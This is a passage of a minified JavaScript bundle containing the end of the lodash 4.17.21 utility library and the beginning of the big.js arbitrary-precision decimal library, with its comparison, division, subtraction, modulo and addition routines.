                (Un.cloneDeep = function (t) {
                  return sr(t, 5);
                }),
                (Un.cloneDeepWith = function (e, n) {
                  return sr(e, 5, (n = "function" == typeof n ? n : t));
                }),
                (Un.cloneWith = function (e, n) {
                  return sr(e, 4, (n = "function" == typeof n ? n : t));
                }),
                (Un.conformsTo = function (t, e) {
                  return null == e || ar(t, e, Oa(e));
                }),
                (Un.deburr = ja),
                (Un.defaultTo = function (t, e) {
                  return null == t || t != t ? e : t;
                }),
                (Un.divide = Au),
                (Un.endsWith = function (e, n, r) {
                  (e = ba(e)), (n = ao(n));
                  var o = e.length,
                    i = (r = r === t ? o : ir(ma(r), 0, o));
                  return (r -= n.length) >= 0 && e.slice(r, i) == n;
                }),
                (Un.eq = Ks),
                (Un.escape = function (t) {
                  return (t = ba(t)) && G.test(t) ? t.replace(F, $e) : t;
                }),
                (Un.escapeRegExp = function (t) {
                  return (t = ba(t)) && $.test(t) ? t.replace(Q, "\\$&") : t;
                }),
                (Un.every = function (e, n, r) {
                  var o = Gs(e) ? _e : fr;
                  return r && wi(e, n, r) && (n = t), o(e, ai(n, 3));
                }),
                (Un.find = ys),
                (Un.findIndex = ji),
                (Un.findKey = function (t, e) {
                  return Le(t, ai(e, 3), wr);
                }),
                (Un.findLast = ws),
                (Un.findLastIndex = Gi),
                (Un.findLastKey = function (t, e) {
                  return Le(t, ai(e, 3), br);
                }),
                (Un.floor = ku),
                (Un.forEach = bs),
                (Un.forEachRight = vs),
                (Un.forIn = function (t, e) {
                  return null == t ? t : gr(t, ai(e, 3), Ra);
                }),
                (Un.forInRight = function (t, e) {
                  return null == t ? t : yr(t, ai(e, 3), Ra);
                }),
                (Un.forOwn = function (t, e) {
                  return t && wr(t, ai(e, 3));
                }),
                (Un.forOwnRight = function (t, e) {
                  return t && br(t, ai(e, 3));
                }),
                (Un.get = Ba),
                (Un.gt = Ws),
                (Un.gte = Fs),
                (Un.has = function (t, e) {
                  return null != t && pi(t, e, _r);
                }),
                (Un.hasIn = Ca),
                (Un.head = Hi),
                (Un.identity = ou),
                (Un.includes = function (t, e, n, r) {
                  (t = Hs(t) ? t : Ka(t)), (n = n && !r ? ma(n) : 0);
                  var o = t.length;
                  return (
                    n < 0 && (n = gn(o + n, 0)),
                    ua(t)
                      ? n <= o && t.indexOf(e, n) > -1
                      : !!o && De(t, e, n) > -1
                  );
                }),
                (Un.indexOf = function (t, e, n) {
                  var r = null == t ? 0 : t.length;
                  if (!r) return -1;
                  var o = null == n ? 0 : ma(n);
                  return o < 0 && (o = gn(r + o, 0)), De(t, e, o);
                }),
                (Un.inRange = function (e, n, r) {
                  return (
                    (n = pa(n)),
                    r === t ? ((r = n), (n = 0)) : (r = pa(r)),
                    (function (t, e, n) {
                      return t >= yn(e, n) && t < gn(e, n);
                    })((e = ya(e)), n, r)
                  );
                }),
                (Un.invoke = Pa),
                (Un.isArguments = js),
                (Un.isArray = Gs),
                (Un.isArrayBuffer = Vs),
                (Un.isArrayLike = Hs),
                (Un.isArrayLikeObject = Zs),
                (Un.isBoolean = function (t) {
                  return !0 === t || !1 === t || (na(t) && Ir(t) == p);
                }),
                (Un.isBuffer = Xs),
                (Un.isDate = Js),
                (Un.isElement = function (t) {
                  return na(t) && 1 === t.nodeType && !ia(t);
                }),
                (Un.isEmpty = function (t) {
                  if (null == t) return !0;
                  if (
                    Hs(t) &&
                    (Gs(t) ||
                      "string" == typeof t ||
                      "function" == typeof t.splice ||
                      Xs(t) ||
                      la(t) ||
                      js(t))
                  )
                    return !t.length;
                  var e = hi(t);
                  if (e == b || e == S) return !t.size;
                  if (ki(t)) return !Mr(t).length;
                  for (var n in t) if (Mt.call(t, n)) return !1;
                  return !0;
                }),
                (Un.isEqual = function (t, e) {
                  return xr(t, e);
                }),
                (Un.isEqualWith = function (e, n, r) {
                  var o = (r = "function" == typeof r ? r : t) ? r(e, n) : t;
                  return o === t ? xr(e, n, t, r) : !!o;
                }),
                (Un.isError = Ys),
                (Un.isFinite = function (t) {
                  return "number" == typeof t && hn(t);
                }),
                (Un.isFunction = Qs),
                (Un.isInteger = $s),
                (Un.isLength = ta),
                (Un.isMap = ra),
                (Un.isMatch = function (t, e) {
                  return t === e || Pr(t, e, ci(e));
                }),
                (Un.isMatchWith = function (e, n, r) {
                  return (
                    (r = "function" == typeof r ? r : t), Pr(e, n, ci(n), r)
                  );
                }),
                (Un.isNaN = function (t) {
                  return oa(t) && t != +t;
                }),
                (Un.isNative = function (t) {
                  if (Ai(t))
                    throw new kt(
                      "Unsupported core-js use. Try https://npms.io/search?q=ponyfill."
                    );
                  return Or(t);
                }),
                (Un.isNil = function (t) {
                  return null == t;
                }),
                (Un.isNull = function (t) {
                  return null === t;
                }),
                (Un.isNumber = oa),
                (Un.isObject = ea),
                (Un.isObjectLike = na),
                (Un.isPlainObject = ia),
                (Un.isRegExp = sa),
                (Un.isSafeInteger = function (t) {
                  return $s(t) && t >= -9007199254740991 && t <= u;
                }),
                (Un.isSet = aa),
                (Un.isString = ua),
                (Un.isSymbol = ca),
                (Un.isTypedArray = la),
                (Un.isUndefined = function (e) {
                  return e === t;
                }),
                (Un.isWeakMap = function (t) {
                  return na(t) && hi(t) == B;
                }),
                (Un.isWeakSet = function (t) {
                  return na(t) && "[object WeakSet]" == Ir(t);
                }),
                (Un.join = function (t, e) {
                  return null == t ? "" : pn.call(t, e);
                }),
                (Un.kebabCase = Ga),
                (Un.last = Yi),
                (Un.lastIndexOf = function (e, n, r) {
                  var o = null == e ? 0 : e.length;
                  if (!o) return -1;
                  var i = o;
                  return (
                    r !== t &&
                      (i = (i = ma(r)) < 0 ? gn(o + i, 0) : yn(i, o - 1)),
                    n == n
                      ? (function (t, e, n) {
                          for (var r = n + 1; r--; ) if (t[r] === e) return r;
                          return r;
                        })(e, n, i)
                      : Ne(e, qe, i, !0)
                  );
                }),
                (Un.lowerCase = Va),
                (Un.lowerFirst = Ha),
                (Un.lt = da),
                (Un.lte = fa),
                (Un.max = function (e) {
                  return e && e.length ? hr(e, ou, Sr) : t;
                }),
                (Un.maxBy = function (e, n) {
                  return e && e.length ? hr(e, ai(n, 2), Sr) : t;
                }),
                (Un.mean = function (t) {
                  return ze(t, ou);
                }),
                (Un.meanBy = function (t, e) {
                  return ze(t, ai(e, 2));
                }),
                (Un.min = function (e) {
                  return e && e.length ? hr(e, ou, Nr) : t;
                }),
                (Un.minBy = function (e, n) {
                  return e && e.length ? hr(e, ai(n, 2), Nr) : t;
                }),
                (Un.stubArray = gu),
                (Un.stubFalse = yu),
                (Un.stubObject = function () {
                  return {};
                }),
                (Un.stubString = function () {
                  return "";
                }),
                (Un.stubTrue = function () {
                  return !0;
                }),
                (Un.multiply = Iu),
                (Un.nth = function (e, n) {
                  return e && e.length ? Kr(e, ma(n)) : t;
                }),
                (Un.noConflict = function () {
                  return ce._ === this && (ce._ = qt), this;
                }),
                (Un.noop = cu),
                (Un.now = Bs),
                (Un.pad = function (t, e, n) {
                  t = ba(t);
                  var r = (e = ma(e)) ? an(t) : 0;
                  if (!e || r >= e) return t;
                  var o = (e - r) / 2;
                  return Fo(Me(o), n) + t + Fo(pe(o), n);
                }),
                (Un.padEnd = function (t, e, n) {
                  t = ba(t);
                  var r = (e = ma(e)) ? an(t) : 0;
                  return e && r < e ? t + Fo(e - r, n) : t;
                }),
                (Un.padStart = function (t, e, n) {
                  t = ba(t);
                  var r = (e = ma(e)) ? an(t) : 0;
                  return e && r < e ? Fo(e - r, n) + t : t;
                }),
                (Un.parseInt = function (t, e, n) {
                  return (
                    n || null == e ? (e = 0) : e && (e = +e),
                    bn(ba(t).replace(tt, ""), e || 0)
                  );
                }),
                (Un.random = function (e, n, r) {
                  if (
                    (r && "boolean" != typeof r && wi(e, n, r) && (n = r = t),
                    r === t &&
                      ("boolean" == typeof n
                        ? ((r = n), (n = t))
                        : "boolean" == typeof e && ((r = e), (e = t))),
                    e === t && n === t
                      ? ((e = 0), (n = 1))
                      : ((e = pa(e)),
                        n === t ? ((n = e), (e = 0)) : (n = pa(n))),
                    e > n)
                  ) {
                    var o = e;
                    (e = n), (n = o);
                  }
                  if (r || e % 1 || n % 1) {
                    var i = vn();
                    return yn(
                      e + i * (n - e + ie("1e-" + ((i + "").length - 1))),
                      n
                    );
                  }
                  return Vr(e, n);
                }),
                (Un.reduce = function (t, e, n) {
                  var r = Gs(t) ? Pe : Fe,
                    o = arguments.length < 3;
                  return r(t, ai(e, 4), n, o, lr);
                }),
                (Un.reduceRight = function (t, e, n) {
                  var r = Gs(t) ? Oe : Fe,
                    o = arguments.length < 3;
                  return r(t, ai(e, 4), n, o, dr);
                }),
                (Un.repeat = function (e, n, r) {
                  return (
                    (n = (r ? wi(e, n, r) : n === t) ? 1 : ma(n)), Hr(ba(e), n)
                  );
                }),
                (Un.replace = function () {
                  var t = arguments,
                    e = ba(t[0]);
                  return t.length < 3 ? e : e.replace(t[1], t[2]);
                }),
                (Un.result = function (e, n, r) {
                  var o = -1,
                    i = (n = wo(n, e)).length;
                  for (i || ((i = 1), (e = t)); ++o < i; ) {
                    var s = null == e ? t : e[Ui(n[o])];
                    s === t && ((o = i), (s = r)), (e = Qs(s) ? s.call(e) : s);
                  }
                  return e;
                }),
                (Un.round = Su),
                (Un.runInContext = et),
                (Un.sample = function (t) {
                  return (Gs(t) ? Xn : Xr)(t);
                }),
                (Un.size = function (t) {
                  if (null == t) return 0;
                  if (Hs(t)) return ua(t) ? an(t) : t.length;
                  var e = hi(t);
                  return e == b || e == S ? t.size : Mr(t).length;
                }),
                (Un.snakeCase = Za),
                (Un.some = function (e, n, r) {
                  var o = Gs(e) ? Re : no;
                  return r && wi(e, n, r) && (n = t), o(e, ai(n, 3));
                }),
                (Un.sortedIndex = function (t, e) {
                  return ro(t, e);
                }),
                (Un.sortedIndexBy = function (t, e, n) {
                  return oo(t, e, ai(n, 2));
                }),
                (Un.sortedIndexOf = function (t, e) {
                  var n = null == t ? 0 : t.length;
                  if (n) {
                    var r = ro(t, e);
                    if (r < n && Ks(t[r], e)) return r;
                  }
                  return -1;
                }),
                (Un.sortedLastIndex = function (t, e) {
                  return ro(t, e, !0);
                }),
                (Un.sortedLastIndexBy = function (t, e, n) {
                  return oo(t, e, ai(n, 2), !0);
                }),
                (Un.sortedLastIndexOf = function (t, e) {
                  if (null != t && t.length) {
                    var n = ro(t, e, !0) - 1;
                    if (Ks(t[n], e)) return n;
                  }
                  return -1;
                }),
                (Un.startCase = Xa),
                (Un.startsWith = function (t, e, n) {
                  return (
                    (t = ba(t)),
                    (n = null == n ? 0 : ir(ma(n), 0, t.length)),
                    (e = ao(e)),
                    t.slice(n, n + e.length) == e
                  );
                }),
                (Un.subtract = _u),
                (Un.sum = function (t) {
                  return t && t.length ? je(t, ou) : 0;
                }),
                (Un.sumBy = function (t, e) {
                  return t && t.length ? je(t, ai(e, 2)) : 0;
                }),
                (Un.template = function (e, n, r) {
                  var o = Un.templateSettings;
                  r && wi(e, n, r) && (n = t),
                    (e = ba(e)),
                    (n = ka({}, n, o, Yo));
                  var i,
                    s,
                    a = ka({}, n.imports, o.imports, Yo),
                    u = Oa(a),
                    c = Ze(a, u),
                    l = 0,
                    d = n.interpolate || gt,
                    f = "__p += '",
                    h = Tt(
                      (n.escape || gt).source +
                        "|" +
                        d.source +
                        "|" +
                        (d === Z ? ut : gt).source +
                        "|" +
                        (n.evaluate || gt).source +
                        "|$",
                      "g"
                    ),
                    p =
                      "//# sourceURL=" +
                      (Mt.call(n, "sourceURL")
                        ? (n.sourceURL + "").replace(/\s/g, " ")
                        : "lodash.templateSources[" + ++ee + "]") +
                      "\n";
                  e.replace(h, function (t, n, r, o, a, u) {
                    return (
                      r || (r = o),
                      (f += e.slice(l, u).replace(yt, tn)),
                      n && ((i = !0), (f += "' +\n__e(" + n + ") +\n'")),
                      a && ((s = !0), (f += "';\n" + a + ";\n__p += '")),
                      r &&
                        (f +=
                          "' +\n((__t = (" + r + ")) == null ? '' : __t) +\n'"),
                      (l = u + t.length),
                      t
                    );
                  }),
                    (f += "';\n");
                  var m = Mt.call(n, "variable") && n.variable;
                  if (m) {
                    if (st.test(m))
                      throw new kt(
                        "Invalid `variable` option passed into `_.template`"
                      );
                  } else f = "with (obj) {\n" + f + "\n}\n";
                  (f = (s ? f.replace(q, "") : f)
                    .replace(z, "$1")
                    .replace(K, "$1;")),
                    (f =
                      "function(" +
                      (m || "obj") +
                      ") {\n" +
                      (m ? "" : "obj || (obj = {});\n") +
                      "var __t, __p = ''" +
                      (i ? ", __e = _.escape" : "") +
                      (s
                        ? ", __j = Array.prototype.join;\nfunction print() { __p += __j.call(arguments, '') }\n"
                        : ";\n") +
                      f +
                      "return __p\n}");
                  var g = $a(function () {
                    return It(u, p + "return " + f).apply(t, c);
                  });
                  if (((g.source = f), Ys(g))) throw g;
                  return g;
                }),
                (Un.times = function (t, e) {
                  if ((t = ma(t)) < 1 || t > u) return [];
                  var n = l,
                    r = yn(t, l);
                  (e = ai(e)), (t -= l);
                  for (var o = Ge(r, e); ++n < t; ) e(n);
                  return o;
                }),
                (Un.toFinite = pa),
                (Un.toInteger = ma),
                (Un.toLength = ga),
                (Un.toLower = function (t) {
                  return ba(t).toLowerCase();
                }),
                (Un.toNumber = ya),
                (Un.toSafeInteger = function (t) {
                  return t ? ir(ma(t), -9007199254740991, u) : 0 === t ? t : 0;
                }),
                (Un.toString = ba),
                (Un.toUpper = function (t) {
                  return ba(t).toUpperCase();
                }),
                (Un.trim = function (e, n, r) {
                  if ((e = ba(e)) && (r || n === t)) return Ve(e);
                  if (!e || !(n = ao(n))) return e;
                  var o = un(e),
                    i = un(n);
                  return vo(o, Je(o, i), Ye(o, i) + 1).join("");
                }),
                (Un.trimEnd = function (e, n, r) {
                  if ((e = ba(e)) && (r || n === t))
                    return e.slice(0, cn(e) + 1);
                  if (!e || !(n = ao(n))) return e;
                  var o = un(e);
                  return vo(o, 0, Ye(o, un(n)) + 1).join("");
                }),
                (Un.trimStart = function (e, n, r) {
                  if ((e = ba(e)) && (r || n === t)) return e.replace(tt, "");
                  if (!e || !(n = ao(n))) return e;
                  var o = un(e);
                  return vo(o, Je(o, un(n))).join("");
                }),
                (Un.truncate = function (e, n) {
                  var r = 30,
                    o = "...";
                  if (ea(n)) {
                    var i = "separator" in n ? n.separator : i;
                    (r = "length" in n ? ma(n.length) : r),
                      (o = "omission" in n ? ao(n.omission) : o);
                  }
                  var s = (e = ba(e)).length;
                  if (en(e)) {
                    var a = un(e);
                    s = a.length;
                  }
                  if (r >= s) return e;
                  var u = r - an(o);
                  if (u < 1) return o;
                  var c = a ? vo(a, 0, u).join("") : e.slice(0, u);
                  if (i === t) return c + o;
                  if ((a && (u += c.length - u), sa(i))) {
                    if (e.slice(u).search(i)) {
                      var l,
                        d = c;
                      for (
                        i.global || (i = Tt(i.source, ba(ct.exec(i)) + "g")),
                          i.lastIndex = 0;
                        (l = i.exec(d));

                      )
                        var f = l.index;
                      c = c.slice(0, f === t ? u : f);
                    }
                  } else if (e.indexOf(ao(i), u) != u) {
                    var h = c.lastIndexOf(i);
                    h > -1 && (c = c.slice(0, h));
                  }
                  return c + o;
                }),
                (Un.unescape = function (t) {
                  return (t = ba(t)) && j.test(t) ? t.replace(W, ln) : t;
                }),
                (Un.uniqueId = function (t) {
                  var e = ++Lt;
                  return ba(t) + e;
                }),
                (Un.upperCase = Ja),
                (Un.upperFirst = Ya),
                (Un.each = bs),
                (Un.eachRight = vs),
                (Un.first = Hi),
                uu(
                  Un,
                  ((wu = {}),
                  wr(Un, function (t, e) {
                    Mt.call(Un.prototype, e) || (wu[e] = t);
                  }),
                  wu),
                  { chain: !1 }
                ),
                (Un.VERSION = "4.17.21"),
                Ie(
                  [
                    "bind",
                    "bindKey",
                    "curry",
                    "curryRight",
                    "partial",
                    "partialRight",
                  ],
                  function (t) {
                    Un[t].placeholder = Un;
                  }
                ),
                Ie(["drop", "take"], function (e, n) {
                  (Wn.prototype[e] = function (r) {
                    r = r === t ? 1 : gn(ma(r), 0);
                    var o =
                      this.__filtered__ && !n ? new Wn(this) : this.clone();
                    return (
                      o.__filtered__
                        ? (o.__takeCount__ = yn(r, o.__takeCount__))
                        : o.__views__.push({
                            size: yn(r, l),
                            type: e + (o.__dir__ < 0 ? "Right" : ""),
                          }),
                      o
                    );
                  }),
                    (Wn.prototype[e + "Right"] = function (t) {
                      return this.reverse()[e](t).reverse();
                    });
                }),
                Ie(["filter", "map", "takeWhile"], function (t, e) {
                  var n = e + 1,
                    r = 1 == n || 3 == n;
                  Wn.prototype[t] = function (t) {
                    var e = this.clone();
                    return (
                      e.__iteratees__.push({ iteratee: ai(t, 3), type: n }),
                      (e.__filtered__ = e.__filtered__ || r),
                      e
                    );
                  };
                }),
                Ie(["head", "last"], function (t, e) {
                  var n = "take" + (e ? "Right" : "");
                  Wn.prototype[t] = function () {
                    return this[n](1).value()[0];
                  };
                }),
                Ie(["initial", "tail"], function (t, e) {
                  var n = "drop" + (e ? "" : "Right");
                  Wn.prototype[t] = function () {
                    return this.__filtered__ ? new Wn(this) : this[n](1);
                  };
                }),
                (Wn.prototype.compact = function () {
                  return this.filter(ou);
                }),
                (Wn.prototype.find = function (t) {
                  return this.filter(t).head();
                }),
                (Wn.prototype.findLast = function (t) {
                  return this.reverse().find(t);
                }),
                (Wn.prototype.invokeMap = Zr(function (t, e) {
                  return "function" == typeof t
                    ? new Wn(this)
                    : this.map(function (n) {
                        return Cr(n, t, e);
                      });
                })),
                (Wn.prototype.reject = function (t) {
                  return this.filter(Ns(ai(t)));
                }),
                (Wn.prototype.slice = function (e, n) {
                  e = ma(e);
                  var r = this;
                  return r.__filtered__ && (e > 0 || n < 0)
                    ? new Wn(r)
                    : (e < 0 ? (r = r.takeRight(-e)) : e && (r = r.drop(e)),
                      n !== t &&
                        (r = (n = ma(n)) < 0 ? r.dropRight(-n) : r.take(n - e)),
                      r);
                }),
                (Wn.prototype.takeRightWhile = function (t) {
                  return this.reverse().takeWhile(t).reverse();
                }),
                (Wn.prototype.toArray = function () {
                  return this.take(l);
                }),
                wr(Wn.prototype, function (e, n) {
                  var r = /^(?:filter|find|map|reject)|While$/.test(n),
                    o = /^(?:head|last)$/.test(n),
                    i = Un[o ? "take" + ("last" == n ? "Right" : "") : n],
                    s = o || /^find/.test(n);
                  i &&
                    (Un.prototype[n] = function () {
                      var n = this.__wrapped__,
                        a = o ? [1] : arguments,
                        u = n instanceof Wn,
                        c = a[0],
                        l = u || Gs(n),
                        d = function (t) {
                          var e = i.apply(Un, xe([t], a));
                          return o && f ? e[0] : e;
                        };
                      l &&
                        r &&
                        "function" == typeof c &&
                        1 != c.length &&
                        (u = l = !1);
                      var f = this.__chain__,
                        h = !!this.__actions__.length,
                        p = s && !f,
                        m = u && !h;
                      if (!s && l) {
                        n = m ? n : new Wn(this);
                        var g = e.apply(n, a);
                        return (
                          g.__actions__.push({
                            func: ps,
                            args: [d],
                            thisArg: t,
                          }),
                          new Kn(g, f)
                        );
                      }
                      return p && m
                        ? e.apply(this, a)
                        : ((g = this.thru(d)),
                          p ? (o ? g.value()[0] : g.value()) : g);
                    });
                }),
                Ie(
                  ["pop", "push", "shift", "sort", "splice", "unshift"],
                  function (t) {
                    var e = Et[t],
                      n = /^(?:push|sort|unshift)$/.test(t) ? "tap" : "thru",
                      r = /^(?:pop|shift)$/.test(t);
                    Un.prototype[t] = function () {
                      var t = arguments;
                      if (r && !this.__chain__) {
                        var o = this.value();
                        return e.apply(Gs(o) ? o : [], t);
                      }
                      return this[n](function (n) {
                        return e.apply(Gs(n) ? n : [], t);
                      });
                    };
                  }
                ),
                wr(Wn.prototype, function (t, e) {
                  var n = Un[e];
                  if (n) {
                    var r = n.name + "";
                    Mt.call(En, r) || (En[r] = []),
                      En[r].push({ name: e, func: n });
                  }
                }),
                (En[qo(t, 2).name] = [{ name: "wrapper", func: t }]),
                (Wn.prototype.clone = function () {
                  var t = new Wn(this.__wrapped__);
                  return (
                    (t.__actions__ = Co(this.__actions__)),
                    (t.__dir__ = this.__dir__),
                    (t.__filtered__ = this.__filtered__),
                    (t.__iteratees__ = Co(this.__iteratees__)),
                    (t.__takeCount__ = this.__takeCount__),
                    (t.__views__ = Co(this.__views__)),
                    t
                  );
                }),
                (Wn.prototype.reverse = function () {
                  if (this.__filtered__) {
                    var t = new Wn(this);
                    (t.__dir__ = -1), (t.__filtered__ = !0);
                  } else (t = this.clone()).__dir__ *= -1;
                  return t;
                }),
                (Wn.prototype.value = function () {
                  var t = this.__wrapped__.value(),
                    e = this.__dir__,
                    n = Gs(t),
                    r = e < 0,
                    o = n ? t.length : 0,
                    i = (function (t, e, n) {
                      for (var r = -1, o = n.length; ++r < o; ) {
                        var i = n[r],
                          s = i.size;
                        switch (i.type) {
                          case "drop":
                            t += s;
                            break;
                          case "dropRight":
                            e -= s;
                            break;
                          case "take":
                            e = yn(e, t + s);
                            break;
                          case "takeRight":
                            t = gn(t, e - s);
                        }
                      }
                      return { start: t, end: e };
                    })(0, o, this.__views__),
                    s = i.start,
                    a = i.end,
                    u = a - s,
                    c = r ? a : s - 1,
                    l = this.__iteratees__,
                    d = l.length,
                    f = 0,
                    h = yn(u, this.__takeCount__);
                  if (!n || (!r && o == u && h == u))
                    return ho(t, this.__actions__);
                  var p = [];
                  t: for (; u-- && f < h; ) {
                    for (var m = -1, g = t[(c += e)]; ++m < d; ) {
                      var y = l[m],
                        w = y.iteratee,
                        b = y.type,
                        v = w(g);
                      if (2 == b) g = v;
                      else if (!v) {
                        if (1 == b) continue t;
                        break t;
                      }
                    }
                    p[f++] = g;
                  }
                  return p;
                }),
                (Un.prototype.at = ms),
                (Un.prototype.chain = function () {
                  return hs(this);
                }),
                (Un.prototype.commit = function () {
                  return new Kn(this.value(), this.__chain__);
                }),
                (Un.prototype.next = function () {
                  this.__values__ === t && (this.__values__ = ha(this.value()));
                  var e = this.__index__ >= this.__values__.length;
                  return {
                    done: e,
                    value: e ? t : this.__values__[this.__index__++],
                  };
                }),
                (Un.prototype.plant = function (e) {
                  for (var n, r = this; r instanceof zn; ) {
                    var o = zi(r);
                    (o.__index__ = 0),
                      (o.__values__ = t),
                      n ? (i.__wrapped__ = o) : (n = o);
                    var i = o;
                    r = r.__wrapped__;
                  }
                  return (i.__wrapped__ = e), n;
                }),
                (Un.prototype.reverse = function () {
                  var e = this.__wrapped__;
                  if (e instanceof Wn) {
                    var n = e;
                    return (
                      this.__actions__.length && (n = new Wn(this)),
                      (n = n.reverse()).__actions__.push({
                        func: ps,
                        args: [es],
                        thisArg: t,
                      }),
                      new Kn(n, this.__chain__)
                    );
                  }
                  return this.thru(es);
                }),
                (Un.prototype.toJSON =
                  Un.prototype.valueOf =
                  Un.prototype.value =
                    function () {
                      return ho(this.__wrapped__, this.__actions__);
                    }),
                (Un.prototype.first = Un.prototype.head),
                oe &&
                  (Un.prototype[oe] = function () {
                    return this;
                  }),
                Un
              );
            })();
          de ? (((de.exports = dn)._ = dn), (le._ = dn)) : (ce._ = dn);
        }.call(bv)),
      wv.exports),
    Iv = 1e6,
    Sv = 1e6,
    _v = "[big.js] ",
    Tv = _v + "Invalid ",
    Bv = Tv + "decimal places",
    Cv = Tv + "rounding mode",
    Ev = _v + "Division by zero",
    xv = {},
    Pv = void 0,
    Ov = /^-?(\d+(\.\d*)?|\.\d+)(e[+-]?\d+)?$/i;
  function Rv(t, e, n, r) {
    var o = t.c;
    if (
      (n === Pv && (n = t.constructor.RM),
      0 !== n && 1 !== n && 2 !== n && 3 !== n)
    )
      throw Error(Cv);
    if (e < 1)
      (r =
        (3 === n && (r || !!o[0])) ||
        (0 === e &&
          ((1 === n && o[0] >= 5) ||
            (2 === n && (o[0] > 5 || (5 === o[0] && (r || o[1] !== Pv))))))),
        (o.length = 1),
        r ? ((t.e = t.e - e + 1), (o[0] = 1)) : (o[0] = t.e = 0);
    else if (e < o.length) {
      if (
        ((r =
          (1 === n && o[e] >= 5) ||
          (2 === n &&
            (o[e] > 5 ||
              (5 === o[e] && (r || o[e + 1] !== Pv || 1 & o[e - 1])))) ||
          (3 === n && (r || !!o[0]))),
        (o.length = e),
        r)
      )
        for (; ++o[--e] > 9; )
          if (((o[e] = 0), 0 === e)) {
            ++t.e, o.unshift(1);
            break;
          }
      for (e = o.length; !o[--e]; ) o.pop();
    }
    return t;
  }
  function Mv(t, e, n) {
    var r = t.e,
      o = t.c.join(""),
      i = o.length;
    if (e)
      o =
        o.charAt(0) +
        (i > 1 ? "." + o.slice(1) : "") +
        (r < 0 ? "e" : "e+") +
        r;
    else if (r < 0) {
      for (; ++r; ) o = "0" + o;
      o = "0." + o;
    } else if (r > 0)
      if (++r > i) for (r -= i; r--; ) o += "0";
      else r < i && (o = o.slice(0, r) + "." + o.slice(r));
    else i > 1 && (o = o.charAt(0) + "." + o.slice(1));
    return t.s < 0 && n ? "-" + o : o;
  }
  (xv.abs = function () {
    var t = new this.constructor(this);
    return (t.s = 1), t;
  }),
    (xv.cmp = function (t) {
      var e,
        n = this,
        r = n.c,
        o = (t = new n.constructor(t)).c,
        i = n.s,
        s = t.s,
        a = n.e,
        u = t.e;
      if (!r[0] || !o[0]) return r[0] ? i : o[0] ? -s : 0;
      if (i != s) return i;
      if (((e = i < 0), a != u)) return (a > u) ^ e ? 1 : -1;
      for (s = (a = r.length) < (u = o.length) ? a : u, i = -1; ++i < s; )
        if (r[i] != o[i]) return (r[i] > o[i]) ^ e ? 1 : -1;
      return a == u ? 0 : (a > u) ^ e ? 1 : -1;
    }),
    (xv.div = function (t) {
      var e = this,
        n = e.constructor,
        r = e.c,
        o = (t = new n(t)).c,
        i = e.s == t.s ? 1 : -1,
        s = n.DP;
      if (s !== ~~s || s < 0 || s > Iv) throw Error(Bv);
      if (!o[0]) throw Error(Ev);
      if (!r[0]) return (t.s = i), (t.c = [(t.e = 0)]), t;
      var a,
        u,
        c,
        l,
        d,
        f = o.slice(),
        h = (a = o.length),
        p = r.length,
        m = r.slice(0, a),
        g = m.length,
        y = t,
        w = (y.c = []),
        b = 0,
        v = s + (y.e = e.e - t.e) + 1;
      for (y.s = i, i = v < 0 ? 0 : v, f.unshift(0); g++ < a; ) m.push(0);
      do {
        for (c = 0; c < 10; c++) {
          if (a != (g = m.length)) l = a > g ? 1 : -1;
          else
            for (d = -1, l = 0; ++d < a; )
              if (o[d] != m[d]) {
                l = o[d] > m[d] ? 1 : -1;
                break;
              }
          if (!(l < 0)) break;
          for (u = g == a ? o : f; g; ) {
            if (m[--g] < u[g]) {
              for (d = g; d && !m[--d]; ) m[d] = 9;
              --m[d], (m[g] += 10);
            }
            m[g] -= u[g];
          }
          for (; !m[0]; ) m.shift();
        }
        (w[b++] = l ? c : ++c), m[0] && l ? (m[g] = r[h] || 0) : (m = [r[h]]);
      } while ((h++ < p || m[0] !== Pv) && i--);
      return (
        w[0] || 1 == b || (w.shift(), y.e--, v--),
        b > v && Rv(y, v, n.RM, m[0] !== Pv),
        y
      );
    }),
    (xv.eq = function (t) {
      return 0 === this.cmp(t);
    }),
    (xv.gt = function (t) {
      return this.cmp(t) > 0;
    }),
    (xv.gte = function (t) {
      return this.cmp(t) > -1;
    }),
    (xv.lt = function (t) {
      return this.cmp(t) < 0;
    }),
    (xv.lte = function (t) {
      return this.cmp(t) < 1;
    }),
    (xv.minus = xv.sub =
      function (t) {
        var e,
          n,
          r,
          o,
          i = this,
          s = i.constructor,
          a = i.s,
          u = (t = new s(t)).s;
        if (a != u) return (t.s = -u), i.plus(t);
        var c = i.c.slice(),
          l = i.e,
          d = t.c,
          f = t.e;
        if (!c[0] || !d[0])
          return d[0] ? (t.s = -u) : c[0] ? (t = new s(i)) : (t.s = 1), t;
        if ((a = l - f)) {
          for (
            (o = a < 0) ? ((a = -a), (r = c)) : ((f = l), (r = d)),
              r.reverse(),
              u = a;
            u--;

          )
            r.push(0);
          r.reverse();
        } else
          for (
            n = ((o = c.length < d.length) ? c : d).length, a = u = 0;
            u < n;
            u++
          )
            if (c[u] != d[u]) {
              o = c[u] < d[u];
              break;
            }
        if (
          (o && ((r = c), (c = d), (d = r), (t.s = -t.s)),
          (u = (n = d.length) - (e = c.length)) > 0)
        )
          for (; u--; ) c[e++] = 0;
        for (u = e; n > a; ) {
          if (c[--n] < d[n]) {
            for (e = n; e && !c[--e]; ) c[e] = 9;
            --c[e], (c[n] += 10);
          }
          c[n] -= d[n];
        }
        for (; 0 === c[--u]; ) c.pop();
        for (; 0 === c[0]; ) c.shift(), --f;
        return c[0] || ((t.s = 1), (c = [(f = 0)])), (t.c = c), (t.e = f), t;
      }),
    (xv.mod = function (t) {
      var e,
        n = this,
        r = n.constructor,
        o = n.s,
        i = (t = new r(t)).s;
      if (!t.c[0]) throw Error(Ev);
      return (
        (n.s = t.s = 1),
        (e = 1 == t.cmp(n)),
        (n.s = o),
        (t.s = i),
        e
          ? new r(n)
          : ((o = r.DP),
            (i = r.RM),
            (r.DP = r.RM = 0),
            (n = n.div(t)),
            (r.DP = o),
            (r.RM = i),
            this.minus(n.times(t)))
      );
    }),
    (xv.neg = function () {
      var t = new this.constructor(this);
      return (t.s = -t.s), t;
    }),
    (xv.plus = xv.add =
      function (t) {
        var e,
          n,
          r,
          o = this,
          i = o.constructor;
        if (((t = new i(t)), o.s != t.s)) return (t.s = -t.s), o.minus(t);
        var s = o.e,
          a = o.c,
          u = t.e,
          c = t.c;
        if (!a[0] || !c[0])
          return c[0] || (a[0] ? (t = new i(o)) : (t.s = o.s)), t;
        if (((a = a.slice()), (e = s - u))) {
          for (
            e > 0 ? ((u = s), (r = c)) : ((e = -e), (r = a)), r.reverse();
            e--;

          )
            r.push(0);
          r.reverse();
